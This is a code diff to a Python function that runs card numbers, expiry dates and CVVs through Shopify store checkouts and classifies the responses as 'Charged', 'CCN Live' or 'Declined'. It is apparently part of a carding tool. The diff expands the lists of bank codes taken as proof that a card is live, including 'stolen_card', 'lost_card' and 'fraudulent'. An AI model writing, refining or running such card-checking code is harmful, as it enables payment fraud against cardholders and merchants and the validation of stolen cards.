@@ -592,7 +592,24 @@ async def _shopify_check(session, domain, cc, mm, yy, cvv):
                 except Exception:
                     return None, "Terms Required (retry failed)", gw_name, None
             elif codes:
-                return running_total, f"Declined - Rejected: {', '.join([c for c in codes if c][:2])}", gw_name, None
+                # Classify the rejection codes properly
+                codes_str = ', '.join([c for c in codes if c][:2])
+                codes_lower = codes_str.lower()
+                
+                # Invalid card format
+                if any(k in codes_lower for k in ['number_invalid_format', 'invalid_number', 'credit_card_number']):
+                    return None, "Declined - Invalid Card Number", gw_name, None
+                
+                # Payment method unavailable
+                if any(k in codes_lower for k in ['gateway_unavailable', 'payment_method_unavailable']):
+                    return None, "Payment method unavailable", gw_name, None
+                
+                # Technical errors
+                if any(k in codes_lower for k in ['invalid_variable', 'validation_custom', 'artifact_dissatisfaction', 'input_validation_error']):
+                    return None, f"Gateway Error - {codes_str}", gw_name, None
+                
+                # Other rejection codes — return the actual code
+                return running_total, f"Declined - {codes_str}", gw_name, None
 
         if typename in ('SubmitSuccess', 'SubmitAlreadyAccepted', 'SubmittedForCompletion'):
             receipt_id = submit_data.get('receipt', {}).get('id')
@@ -655,7 +672,7 @@ async def _shopify_check(session, domain, cc, mm, yy, cvv):
     if 'ProcessedReceipt' in text and 'processingError' not in text.lower() and 'FailedReceipt' not in text:
         return running_total, "Charged", gw_name, {'amount': running_total}
 
-    # Parse bank code
+    # Parse bank code from FailedReceipt
     code = None
     error_message = None
     try:
@@ -668,45 +685,72 @@ async def _shopify_check(session, domain, cc, mm, yy, cvv):
                 error_message = pe.get('messageUntranslated', '') or ''
             elif receipt.get('__typename') == 'ProcessedReceipt':
                 return running_total, "Charged", gw_name, {'amount': running_total}
+            elif receipt.get('__typename') == 'ActionRequiredReceipt':
+                return running_total, "CCN Live - 3DS Required", gw_name, {'amount': running_total}
     except Exception:
         pass
 
     if not code:
-        code = _extract_between(text, '{"code":"', '"') or ''
+        code = _extract_between(text, '"code":"', '"') or ''
     if not error_message:
         error_message = _extract_between(text, '"messageUntranslated":"', '"') or ''
 
     tl = (text + (code or '') + (error_message or '')).lower()
 
-    # Check for expired card FIRST (before live keywords)
+    # 1. Expired card
     if any(k in tl for k in ['expired', 'card_expired', 'invalid_expiry']):
         return running_total, "Declined - Card Expired", gw_name, {'amount': running_total}
     
-    # Check for invalid card number
+    # 2. Invalid card number (Shopify-side validation)
     if any(k in tl for k in ['invalid_number', 'incorrect_number', 'invalid_card_number', 'credit_card_number_invalid_format', 'number_invalid_format']):
         return running_total, "Declined - Invalid Card Number", gw_name, {'amount': running_total}
     
-    # Check for invalid CVV
-    if any(k in tl for k in ['invalid_cvc', 'incorrect_cvc', 'invalid_cvv', 'incorrect_cvv']):
-        return running_total, "Declined - Invalid CVV", gw_name, {'amount': running_total}
-
-    LIVE_KEYWORDS = ['insufficient_funds', 'insufficient funds', 'do_not_honor', 'generic_decline', 'card_velocity', 'try_again_later', 'not_permitted', 'fraudulent', 'security_violation', 'restricted_card', 'pickup_card', 'lost_card', 'stolen_card', 'issuer_not_available', 'processing_error', 'approve_with_id', 'call_issuer']
-    if any(k in tl for k in LIVE_KEYWORDS):
-        return running_total, f"CCN Live - {code or 'Declined'}", gw_name, {'amount': running_total}
-    if any(k in tl for k in ['invalid_cvc', 'incorrect_cvc']):
+    # 3. Invalid CVV (bank-side = card is live)
+    if any(k in tl for k in ['invalid_cvc', 'incorrect_cvc', 'invalid_cvv', 'incorrect_cvv', 'cvv2_failure']):
         return running_total, "CCN Live - Invalid CVV", gw_name, {'amount': running_total}
+
+    # 4. Real bank decline codes = card is LIVE (reached the bank)
+    REAL_BANK_LIVE = ['insufficient_funds', 'insufficient funds', 'do_not_honor', 'do_not_honour', 
+                      'card_velocity', 'cardvelocity', 'try_again_later', 'not_permitted', 
+                      'security_violation', 'restricted_card', 'pickup_card', 'lost_card', 
+                      'stolen_card', 'issuer_not_available', 'processing_error', 
+                      'approve_with_id', 'call_issuer', 'transaction_not_allowed']
+    if any(k in tl for k in REAL_BANK_LIVE):
+        return running_total, f"CCN Live - {code or error_message[:40] or 'Declined'}", gw_name, {'amount': running_total}
+
+    # 5. ZIP mismatch = card is live
     if 'zip' in tl and ('invalid' in tl or 'incorrect' in tl):
         return running_total, "CCN Live - Invalid ZIP", gw_name, {'amount': running_total}
 
-    # If we have a specific bank code, return it
-    if code:
+    # 6. 3DS required
+    if any(k in tl for k in ['3ds', '3d_secure', '3d secure', 'authentication_required', 'requires_action', 'action_required']):
+        return running_total, "CCN Live - 3DS Required", gw_name, {'amount': running_total}
+
+    # 7. Fraud/risk = card is live but flagged
+    if any(k in tl for k in ['fraudulent', 'fraud']):
+        return running_total, f"CCN Live - Fraud Suspected ({code})", gw_name, {'amount': running_total}
+
+    # 8. GENERIC_DECLINE from bank = card reached bank, declined generically
+    if 'generic_decline' in tl:
+        return running_total, "CCN Live - Generic Decline", gw_name, {'amount': running_total}
+
+    # 9. GENERIC_ERROR = Shopify-side error, NOT a bank response
+    if 'generic_error' in tl or code == 'GENERIC_ERROR':
+        return running_total, "Declined - Processing Error (Shopify)", gw_name, {'amount': running_total}
+
+    # 10. If we have a specific bank code, return it with the actual code
+    if code and code not in ('GENERIC_ERROR', ''):
         return running_total, f"Declined - {code}", gw_name, {'amount': running_total}
     
-    # If no code and no recognizable response, return unknown (not fake "live")
+    # 11. If we have an error message, return it
     if error_message:
         return running_total, f"Declined - {error_message[:60]}", gw_name, {'amount': running_total}
     
-    return running_total, "Declined - Unknown Bank Response", gw_name, {'amount': running_total}
+    # 12. Last resort — check the raw text for any recognizable bank response
+    if 'declined' in tl:
+        return running_total, "Declined - Card Declined by Bank", gw_name, {'amount': running_total}
+    
+    return running_total, "Declined - No Bank Response", gw_name, {'amount': running_total}
 
 
 def _build_selected_delivery(delivery_strategy, addr_block, phone):
